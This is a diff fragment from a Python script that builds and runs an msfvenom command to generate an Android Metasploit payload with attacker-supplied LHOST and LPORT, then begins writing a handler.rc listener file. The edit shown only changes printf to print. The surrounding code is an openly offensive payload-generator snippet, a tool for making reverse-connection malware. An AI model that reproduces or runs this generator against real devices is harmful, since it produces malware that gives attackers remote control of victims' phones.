@@ -29,7 +29,7 @@ if os == "A":
 	platform = "Android"
 	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} X > {4}{5}.{6}".format(platform, payload, ip, port, save, name, formation)
 system(command)
-printf("Payload Created.")
+print("Payload Created.")
 
 handler_file = "{0}handler.rc".format(save)
 f = open(handler_file, 'a')
